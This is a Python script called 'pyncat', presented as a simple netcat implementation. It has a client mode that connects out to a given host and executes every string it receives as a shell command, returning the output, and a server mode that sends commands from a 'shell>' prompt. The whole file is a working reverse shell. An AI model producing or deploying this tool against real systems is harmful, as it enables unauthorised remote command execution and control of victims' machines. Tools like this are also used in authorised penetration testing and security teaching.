import sys, socket, threading, subprocess, argparse,os

verbose = ""

def client_mode(host,port):

    if verbose:
        print("[*] Connecting >> host: ",str(host)," port: " + str(port))

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host,port)) # connect to target host
    
    # receive command and send output of executed command back to server
    while True:
        data = client.recv(4096)
        
        if data[:2].decode("utf-8") == 'cd' and len(data) > 2:
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.run(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.decode('utf-8') + cmd.stderr.decode('utf-8')
            client.send(str.encode(output_bytes + str(os.getcwd())))

def server_mode(host,port):

    # Bind on specified host and port and set server to listen for new connections
    def socket_bind(host,port):
        try:    
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((host,port))
            server.listen(5)
            
            if verbose:
                print("[*] Listening >> host:",str(host),"Port:",str(port))
            
            return server
        except Exception as e:
            print("Error binding to socket", e)
    
    # Accept connections. When connection received call client_session
    def socket_accept(server):
        conn,addr = server.accept()

        if verbose:
            print('[*] Accepted connection >> host:' + str(addr[0]) + 'port:' + str(addr[1]))
        
        client_session(conn)
        #client_thread = threading.Thread(target=client_session,args=(conn,addr))
        #client_thread.start()
    
    # Send input to client
    def client_session(conn):
        while True:    
            data = input('shell> ')
            if data == "quit" or data == "exit":
                conn.close()
                exit()
            if len(str.encode(data)) > 0:
                conn.send(data.encode('UTF-8')) 
                print(receive(conn).decode('UTF-8'))

    # receieve data
    def receive(conn):
        response = b''
        while True:
            chunk = conn.recv(4096)
            response = response + chunk
            if len(chunk) < 4096:
                break
        return response

    s_socket = socket_bind(host,port)
    socket_accept(s_socket)
        
def main():

    global verbose

    print("""
                                      __ 
        ____  __  ______  _________ _/ /_
       / __ \/ / / / __ \/ ___/ __ `/ __/
      / /_/ / /_/ / / / / /__/ /_/ / /_  
     / .___/\__, /_/ /_/\___/\__,_/\__/  
    /_/    /____/                  
     
pyncat | A simple python implementation of netcat
          written by @infoplague

    """)
    parser = argparse.ArgumentParser(description="A python implementation of netcat.")
    parser.add_argument("-l", "--listen", help="listen for incoming connections (listen mode)", action="store_true")
    parser.add_argument("-p", "--port", help="source port", type=int, required=True)
    parser.add_argument("-t", "--host", help="target host / IP to listen on if in listen mode", default="0.0.0.0",type=str, required=True)
    parser.add_argument("-v", "--verbose", help="increase verbosity", action="store_true")

    args = parser.parse_args()

    # parse arguements
    listen = args.listen
    port = args.port
    host = args.host
    verbose = args.verbose

    if listen is False:
        try:
            client_mode(host,port)
        except Exception as e:
            print('error',e)
            exit()

    if listen:
        try:
            server_mode(host, port)
        except Exception as e:
            print('error',e)
            exit()
main()
